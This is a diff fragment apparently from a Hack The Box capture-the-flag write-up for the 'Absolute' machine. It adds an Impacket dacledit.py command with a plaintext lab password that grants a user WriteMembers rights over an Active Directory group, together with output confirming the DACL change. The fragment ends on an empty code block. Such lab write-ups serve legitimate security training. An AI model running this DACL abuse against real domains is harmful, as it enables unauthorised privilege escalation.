@@ -516,6 +516,19 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 First ill grant ownership over the object
 
 ```python
+faketime -f +7h dacledit.py -action write -rights 'WriteMembers' -principal 'm.lovegod' -target-dn 'CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB' 'absolute.htb'/m.lovegod:'AbsoluteLDAP2022!' -k -dc-ip 10.129.232.60
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20260817-022737.bak
+[*] DACL modified successfully!
+```
+
+Then ill grant myself the permission to add members
+
+```python
 
 ```
 
